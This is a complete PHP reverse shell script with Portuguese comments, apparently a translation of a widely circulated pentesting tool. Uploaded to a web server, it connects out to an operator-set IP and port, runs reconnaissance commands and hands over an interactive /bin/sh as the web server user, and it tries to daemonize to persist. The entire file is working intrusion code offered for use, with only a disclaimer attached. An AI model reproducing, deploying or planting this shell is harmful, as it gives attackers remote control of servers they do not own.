<?php
// php-reverse-shell - Uma implementação de Shell Reverso em PHP
// Copyright (C) 2007 r0daemon@gmail.com
//
// Esta ferramenta pode ser usada apenas para fins legais. Os usuários assumem total responsabilidade
// por quaisquer ações realizadas com esta ferramenta. O autor não se responsabiliza
// por danos causados por esta ferramenta. Se esses termos não forem aceitáveis para você,
// então não use esta ferramenta.
//
// Em todos os outros aspectos, aplica-se a GPL versão 3:
//
// Este programa é software livre; você pode redistribuí-lo e/ou modificá-lo
// nos termos da Licença Pública Geral GNU versão 2 conforme
// publicada pela Free Software Foundation.
//
// Este programa é distribuído na esperança de que seja útil,
// mas SEM NENHUMA GARANTIA; sem mesmo a garantia implícita de
// COMERCIALIZAÇÃO ou ADEQUAÇÃO A UM PROPÓSITO ESPECÍFICO. Veja a
// Licença Pública Geral GNU para mais detalhes.
//
// Você deve ter recebido uma cópia da Licença Pública Geral GNU junto
// com este programa; se não, escreva para a Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// Esta ferramenta pode ser usada apenas para fins legais. Os usuários assumem total responsabilidade
// por quaisquer ações realizadas com esta ferramenta. Se esses termos não forem aceitáveis para
// você, então não use esta ferramenta.
//
// Você é incentivado a enviar comentários, melhorias ou sugestões
// para mim em r0daemon@gmail.com
//
// Descrição
// -----------
// Este script fará uma conexão TCP de saída para um IP e porta definidos no código.
// O destinatário receberá um shell rodando como o usuário atual (normalmente apache).
//
// Limitações
// -----------
// proc_open e stream_set_blocking requerem PHP versão 4.3+ ou 5+
// O uso de stream_select() em descritores de arquivo retornados por proc_open() falhará e retornará FALSE no Windows.
// Algumas opções de compilação são necessárias para daemonização (como pcntl, posix). Estas raramente estão disponíveis.
//
// Uso
// -----

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // ALTERE AQUI
$port = 1234;       // ALTERE AQUI
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemoniza o processo, se possível, para evitar processos zumbis depois
//

// pcntl_fork quase nunca está disponível, mas permitirá daemonizar
// o processo PHP e evitar zumbis. Vale a pena tentar...
if (function_exists('pcntl_fork')) {
	// Faz o fork e o processo pai sai
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERRO: Não foi possível realizar fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Processo pai sai
	}

	// Torna o processo atual o líder da sessão
	// Só terá sucesso se fizermos fork
	if (posix_setsid() == -1) {
		printit("Erro: Não foi possível executar setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("AVISO: Falha ao daemonizar. Isso é bem comum e não é fatal.");
}

// Muda para um diretório seguro
chdir("/");

// Remove qualquer umask herdado
umask(0);

//
// Executa o shell reverso...
//

// Abre conexão reversa
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Inicia o processo do shell
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin é um pipe que o processo filho lerá
   1 => array("pipe", "w"),  // stdout é um pipe que o processo filho escreverá
   2 => array("pipe", "w")   // stderr é um pipe que o processo filho escreverá
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERRO: Não foi possível iniciar o shell");
	exit(1);
}

// Define tudo como não bloqueante
// Motivo: ocasionalmente leituras irão bloquear, mesmo que stream_select diga que não
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Shell reverso aberto com sucesso para $ip:$port");

while (1) {
	// Verifica fim da conexão TCP
	if (feof($sock)) {
		printit("ERRO: Conexão com shell terminada");
		break;
	}

	// Verifica fim da saída padrão do processo
	if (feof($pipes[1])) {
		printit("ERRO: Processo do shell terminado");
		break;
	}

	// Espera até que um comando seja enviado por $sock, ou alguma
	// saída esteja disponível em STDOUT ou STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// Se podemos ler do socket TCP, envia
	// dados para o STDIN do processo
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCKET LEITURA");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCKET: $input");
		fwrite($pipes[0], $input);
	}

	// Se podemos ler do STDOUT do processo
	// envia os dados para a conexão TCP
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT LEITURA");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// Se podemos ler do STDERR do processo
	// envia os dados para a conexão TCP
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR LEITURA");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Como print, mas não faz nada se já daemonizamos
// (Não consigo descobrir como redirecionar STDOUT como um daemon de verdade)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>
